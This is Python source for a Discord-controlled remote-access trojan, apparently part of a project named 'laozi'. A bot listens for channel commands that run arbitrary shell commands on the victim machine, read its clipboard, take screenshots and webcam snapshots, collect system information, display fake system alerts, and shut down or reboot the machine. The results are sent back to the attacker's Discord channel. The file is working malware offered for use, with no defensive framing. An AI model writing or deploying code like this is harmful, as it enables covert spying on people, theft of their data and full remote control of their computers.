import os
from discord import Client, File
from laozi.payloads.systeminfo import get_sys_info
from laozi.payloads.clipboard import get_clipboard
from laozi.payloads.screenshot import get_screenshot
from laozi.payloads.webcam import get_webcam_snapshot
from laozi.payloads.website import open_website
from laozi.payloads.messagebox import display_messagebox
from laozi.payloads.voice import play_voice
from laozi.payloads.power import set_power_options


class DiscordBotClient(Client):
    def __init__(self, target_channel_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.target_channel_id = target_channel_id
        self.command_text = "\n".join(sorted([
            "!help                                    -> Show available commands",
            "!alert       <message>                   -> Trigger message box",
            "!clipboard                               -> Get clipboard content",
            "!execute     <command>                   -> Execute a shell command",
            "!screenshot                              -> Take a screenshot",
            "!sysinfo                                 -> Get system information",
            "!webcam                                  -> Get webcam snapshot",
            "!website     <url>                       -> Open a website",
            "!voice       <text>                      -> Read text out loud",
            "!power       <shutdown, reboot, logout>  -> Set power options"
        ]))

    async def on_ready(self):
        channel = self.get_channel(self.target_channel_id)
        if channel:
            await channel.send(f"@everyone Hello!\nHere are the available commands:\n```{self.command_text}```")

    async def on_message(self, message):
        if message.author == self.user:
            return

        command, *args = message.content.strip().split(maxsplit=1)
        args = args[0] if args else ""

        commands = {
            "!sysinfo": self.handle_system_info,
            "!execute": self.handle_execute_command,
            "!alert": self.handle_alert_command,
            "!clipboard": self.handle_clipboard,
            "!website": self.handle_website_command,
            "!webcam": self.handle_webcam_snapshot,
            "!screenshot": self.handle_screenshot,
            "!voice": self.handle_voice_command,
            "!power": self.handle_power_options,
        }

        handler = commands.get(command)
        commands_with_args = {"!execute", "!alert", "!website", "!voice", "!power"}

        if handler:
            if command in commands_with_args and not args:
                await message.channel.send(f"Usage: `{command} <parameter>`")
            else:
                await handler(message.channel, args)
        elif command.startswith("!"):
            if command == "!help":
                await message.channel.send(f"Here are the available commands:\n```{self.command_text}```")
            else:
                await message.channel.send(f"Unknown command: `{command}`.\nType `!help` for a list of commands.")

    async def handle_system_info(self, channel, _):
        sys_info = get_sys_info()
        lines = sys_info.split("\n", 7)
        basic = "\n".join(lines[:7])
        detailed = "\n".join(lines[7:])

        with open("detailed_sys_info.txt", "w") as f:
            f.write(detailed)

        await channel.send(f"```{basic}```")
        await channel.send(file=File("detailed_sys_info.txt"))
        os.remove("detailed_sys_info.txt")

    async def handle_clipboard(self, channel, _):
        clipboard_content = get_clipboard() or "Clipboard is empty or unavailable."
        await channel.send(f"Clipboard content:\n```{clipboard_content}```")

    async def handle_webcam_snapshot(self, channel, _):
        webcam_snapshot = get_webcam_snapshot()
        if webcam_snapshot:
            await channel.send(file=File(webcam_snapshot))
            os.remove(webcam_snapshot)
        else:
            await channel.send("Failed to capture webcam snap.")

    async def handle_screenshot(self, channel, _):
        screenshot = get_screenshot()
        if screenshot:
            await channel.send(file=File(screenshot))
            os.remove(screenshot)
        else:
            await channel.send("Failed to capture screenshot.")

    async def handle_execute_command(self, channel, command):
        output = os.popen(command).read()
        await channel.send(f"Executed command:\n```{command}```\nOutput:\n```{output}```")

    async def handle_alert_command(self, channel, message_text):
        display_messagebox(message_text, "System Alert", "info")
        await channel.send(f"Alert displayed: `{message_text}`")

    async def handle_website_command(self, channel, url):
        success = open_website(url)
        if success:
            await channel.send(f"Website opened: `{url}`")
        else:
            await channel.send(f"Failed to open website: `{url}`")

    async def handle_voice_command(self, channel, text):
        play_voice(text)
        await channel.send(f"Played voice message: `{text}`")

    async def handle_power_options(self, channel, option):
        try:
            set_power_options(option)
            await channel.send(f"Power option `{option}` executed.")
        except ValueError as e:
            await channel.send(f"Error: {str(e)}")
